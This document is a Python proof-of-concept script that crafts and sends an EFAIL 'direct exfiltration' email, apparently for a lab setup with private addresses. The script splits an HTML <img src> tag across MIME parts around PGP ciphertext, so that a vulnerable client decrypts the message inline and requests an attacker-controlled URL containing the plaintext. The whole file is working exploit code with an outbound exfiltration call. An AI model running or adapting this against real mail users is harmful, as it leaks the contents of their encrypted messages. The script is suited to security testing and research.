#!/usr/bin/env -S uv run --with pgpy
"""
Send a multipart/mixed EFAIL direct exfiltration message to the owner of
../pgp1-intern-pub.asc.

Encrypts to ../pgp1-intern-pub.asc.

Edit ATTACKER_URL / PLAINTEXT / SUBJECT below if needed, then run:
  ./efail-direct-pgp.py
"""

import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path

# Attacker-controlled server that will receive the decrypted plaintext as a URL path.
# Replace with a host you control and can observe requests on (e.g. netcat, requestbin).
ATTACKER_URL = "http://10.0.2.1:8000"

import pgpy  # noqa: E402  (import after ATTACKER_URL so config stays at top)

# --- config (no CLI) ---
SMTP_HOST = "10.0.2.2"
SMTP_PORT = 25
SENDER = "plain@external.test"
SUBJECT = "EFAIL: PGP direct variant"
PLAINTEXT = "Hello from pgpy"

SCRIPT_DIR = Path(__file__).resolve().parent
PUBKEY_PATH = (SCRIPT_DIR / "../pgp1-intern-pub.asc").resolve()


def load_public_key(key_path: Path) -> pgpy.PGPKey:
    key_data = key_path.read_text(encoding="utf-8")
    key, _ = pgpy.PGPKey.from_blob(key_data)

    if key.is_public is False:
        raise ValueError(f"Expected a public key at {key_path}, got private key material")

    return key


def recipient_email_from_key(public_key: pgpy.PGPKey) -> str:
    """Resolve envelope/header recipient from the key's primary user ID (owner)."""
    for uid in public_key.userids:
        email = getattr(uid, "email", None)
        if email:
            return str(email).strip()
    for uid in public_key.userids:
        text = uid.userid
        m = re.search(r"<\s*([^>\s]+)\s*>", text)
        if m:
            return m.group(1).strip()
    raise ValueError(
        f"No email found in user IDs of {PUBKEY_PATH}; add a UID with an email to the key."
    )


def encrypt_inline(
    recipient_pubkey: pgpy.PGPKey,
    plaintext: str,
) -> str:
    """Encrypt plaintext to ``recipient_pubkey`` and return ASCII-armored ciphertext."""
    pgp_message = pgpy.PGPMessage.new(plaintext, cleartext=False)
    encrypted = recipient_pubkey.encrypt(pgp_message)
    return str(encrypted)


def build_email(sender: str, recipient: str, subject: str, public_key: pgpy.PGPKey, encrypted_body: str) -> MIMEMultipart:
    """Build a multipart/mixed EFAIL direct exfiltration message.

    Structure:
      multipart/mixed
        text/html                        -- opens <img src="ATTACKER_URL/  (unclosed)
        text/html; name="encrypted.pgp"  -- the PGP ciphertext; CipherMail's inline
                                            PGP binary handler decrypts it in-place
        text/html                        -- closes the src attribute and img tag

    A client that renders all three parts sequentially will produce an <img>
    whose src URL contains the decrypted plaintext, causing the client to fetch
    ATTACKER_URL/<plaintext> and exfiltrate the secret.
    """
    msg = MIMEMultipart("mixed")
    msg["From"] = sender
    msg["To"] = recipient
    msg["Subject"] = subject

    cts = [
        encrypt_inline(public_key, f'<html><body><img src="{ATTACKER_URL}/'),
        encrypted_body,
        encrypt_inline(public_key, '" /></body></html>'),
    ]

    for i, ct in enumerate(cts):
        cipher_part = MIMEText(ct, "html")
        cipher_part.replace_header("Content-Type", f'text/html; name="foo{i}.pgp"')
        msg.attach(cipher_part)

    return msg
    
def send_mail(host: str, port: int, msg: MIMEMultipart) -> None:
    with smtplib.SMTP(host, port, timeout=30) as smtp:
        smtp.send_message(msg)


def main() -> None:
    public_key = load_public_key(PUBKEY_PATH)
    recipient = recipient_email_from_key(public_key)
    encrypted_body = encrypt_inline(public_key, PLAINTEXT)
    email_message = build_email(SENDER, recipient, SUBJECT, public_key, encrypted_body)
    send_mail(SMTP_HOST, SMTP_PORT, email_message)

    print(
        f"EFAIL direct exfiltration message sent from {SENDER} to {recipient} "
        f"via {SMTP_HOST}:{SMTP_PORT}"
    )


if __name__ == "__main__":
    main()
